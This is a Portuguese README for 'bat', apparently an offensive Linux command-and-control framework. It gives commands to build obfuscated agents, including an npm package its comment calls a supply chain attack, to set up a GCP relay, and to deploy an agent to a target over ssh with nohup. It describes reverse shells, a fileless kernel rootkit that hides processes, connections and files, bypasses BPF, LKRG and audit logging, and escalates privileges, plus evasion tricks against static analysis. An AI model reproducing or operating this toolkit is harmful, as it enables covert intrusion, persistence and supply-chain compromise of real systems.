# versão demo de teste

## operador
```bash
apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu
go install mvdan.cc/garble@latest #pro bin stealth 
cp build.env.example build.env && nano build.env   #secret é o HMAC server/agent  
./build.sh                                          # gera bin/ com npm (supply chain attack) e "ferramenta de rede" com função real. as duas executam o agent
```

## relay (rodar como root)
```bash
scp -r relay/ kperf-qos/ host@$RELAY_IP:/tmp/bat/
ssh ubuntu@$RELAY_IP 'cd /tmp/bat && sudo bash relay/setup.sh --secret <SECRET>'
./relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc  # push kperf-qos + kcc scripts
```

## ligar o server
```bash
./bin/bat-server-v10-arm64 -listen 0.0.0.0:9443 -relay host@$RELAY_IP -key $BAT_KEY
```

## deploy do agent
```bash
scp -i $BAT_KEY ./bin/bat-agent-v10-x86_64 ubuntu@TARGET:/home/ubuntu/
ssh -i $BAT_KEY ubuntu@TARGET 'chmod +x /home/ubuntu/bat-agent-v10-x86_64 && nohup /home/ubuntu/bat-agent-v10-x86_64 >/dev/null 2>&1 &'
```

## rebuild servidor
```bash
source build.env && cd agent && make -B server-arm64 \
  SERVER="$RELAY_IP:$C2_PORT" FALLBACK="$RELAY_IP:$C2_PORT" \
  RAWSOCK_CB="$RELAY_IP:$C2_PORT" KCC_ADDR="$RELAY_IP:$KCC_PORT" \
  TRIGGER="${TRIGGER:-udp}" INTERVAL="${BEACON_INTERVAL:-30s}" SECRET="$SECRET"
# nunca usar 'go build' direto pq SharedSecret fica vazio e agentes são rejeitados
```

<img width="1126" height="2117" alt="IMG_20260417_233827" src="https://github.com/user-attachments/assets/c94c390a-a1bd-457c-b50e-9bf1f6fce551" />


bat funciona em três partes: agente (target), servidor (operador) e relay (meio)

## o que faz

o agente beacona via HTTPS para o servidor, esconde a si mesmo com um rootkit LKM em nível de kernel, e executa TTPs so comando. todo processo udo autenticado com HMAC-SHA256, tudo obfuscado em tempo de build

## componentes

**agent**  roda no target. beacon HTTPS, K-series autônomo no startup, dispatcher de TTPs

**server**  console readline do operador. Lista agentes, dispara TTPs, abre shell reverso, gerencia relay

**relay (GCP)**  nginx + batrev tunnel + kcc-server. o agente fala com o relay; o relay encaminha para o operador local

**kcc-server**  compila `kperf_qos.ko` por demanda para qualquer kernel 6.x. cache por versão entrega instantânea se já compilado

## K-series (stealth de kernel)

no startup, o agente detecta o kernel, baixa o `.ko` do KCC, carrega via `memfd_create + finit_module` (sem tocar disco), e registra via sysfs. agente invisível em `ps`, conexões invisíveis em `/proc/net/tcp`, binário invisível no filesystem.


## evasão

- strings sensíveis: XOR-encoded em compile-time
- builds de produção: `garble -literals -tiny -seed=random`  sem strings, sem símbolos, binário único por build
- go module path: `core/mon`  não sinaliza como C2 em análise estática
- LKM renomeado: `bat_stealth` → `kperf_qos`, sysfs em `/sys/kernel/cpu_qos_ctrl/`

## Singularity

O LKM (`kperf-qos/`) é derivado do [Singularity](https://github.com/MatheuZSecurity/Singularity) rootkit ftrace para Linux 6.x.

**aproveitado originalmente do singularity:** toda a infraestrutura de hooks (pid hiding, TCP hiding, filesystem hiding, BPF bypass, LKRG bypass, audit drop, privilege escalation via sinal 59).

**reescrito:** `sysfs_iface.c` o Singularity usa sinais para controle. O bat precisa registrar PID/porta/path em runtime e consultar estado. a solução foi um kobject sysfs com atributos `cpu_affinity`, `freq_policy`, `mem_limit`, `qos_state`, `sched_reset`.
